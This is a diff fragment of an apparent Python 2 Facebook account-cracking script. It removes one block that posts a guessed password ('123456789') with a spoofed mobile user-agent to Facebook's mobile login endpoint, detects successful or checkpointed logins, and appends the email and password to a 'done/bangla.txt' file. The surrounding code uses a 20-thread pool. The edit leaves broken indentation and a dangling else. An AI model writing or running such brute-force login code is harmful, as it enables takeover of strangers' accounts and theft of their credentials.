@@ -654,23 +654,7 @@ def pilih_bangla():
 																	cek.write('\n   [CP] '+em+' • '+pz7)
 																	cek.close()
 																	CP.append(em)
-																	else:
-															pz8 = '123456789'
-															rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
-															xo = rex.content
-															if 'mbasic_logout_button' in xo or 'save-device' in xo:
-																print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz8
-																oke = open('done/bangla.txt', 'a')
-																oke.write('\n   [OK] '+em+' • '+pz8)
-																oke.close()
-																oks.append(em)
-															else:
-																if 'checkpoint' in xo:
-																	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz8
-																	cek = open('done/bangla.txt', 'a')
-																	cek.write('\n   [CP] '+em+' • '+pz8)
-																	cek.close()
-																	CP.append(em)
+																	
 		except:
 			pass
 	p = ThreadPool(20)
